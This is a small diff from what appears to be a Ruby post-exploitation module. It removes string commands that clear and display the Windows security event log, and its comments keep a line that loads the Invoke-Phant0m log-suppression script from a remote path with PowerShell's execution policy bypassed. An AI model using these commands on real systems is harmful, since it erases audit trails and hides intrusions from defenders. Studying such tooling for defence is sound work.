@@ -164,8 +164,6 @@ def ls_stage1
   upload = datastore['UPLOAD']
   # TODO: use IEXdownload() method
   # local_host = datastore['LHOST']
-  dell = "wevtutil.exe cl security" # delete security event logs
-  chek = "cscript eventquery.vbs /L security" # display security event logs
   #
   # TODO: fix powershell file remote execution
   # powershell.exe -exec bypass; Import-Module #{remote}\\Invoke-Phant0m.ps1; Invoke-Phant0m
